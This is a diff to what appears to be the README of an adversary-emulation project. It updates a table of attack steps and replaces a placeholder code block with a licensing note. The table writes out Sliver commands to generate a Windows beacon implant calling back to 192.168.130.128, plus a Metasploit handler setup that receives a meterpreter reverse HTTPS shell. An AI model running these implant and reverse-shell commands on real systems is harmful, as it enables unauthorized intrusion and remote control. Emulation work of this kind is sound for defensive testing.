@@ -95,7 +95,7 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 
 | Steps        | Description	                  | Executor                 |
 |:-------------|:-------------------------------|:-------------------------|
-| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | ```sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls```  |
+| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | ```<br>sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls<br>```  |
 | Execution | Download&Execute the sliver implant.   | sliver > sessions -i session_id |
 | Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | sliver > pwd   |
 | Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>msf6 > use exploit/multi/handler<br>msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https<br>msf6 exploit(multi/handler) > set lport 9091<br>msf6 exploit(multi/handler) > set lhost 192.168.130.128<br>msf6 exploit(multi/handler) > exploit -j -z<br> sliver (BOLD_MUSCULATURE) > msf --lhost 192.168.130.128 -l 9091<br>msf6 exploit(multi/handler) > sessions 1 |
@@ -113,15 +113,8 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 
 
 
-
-
-
-
-
+**_Licensing_**
 ```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
+To discuss licensing opportunities, please reach out to aurora@[] or directly to .
 ```
 
-```
-The final element.
-```
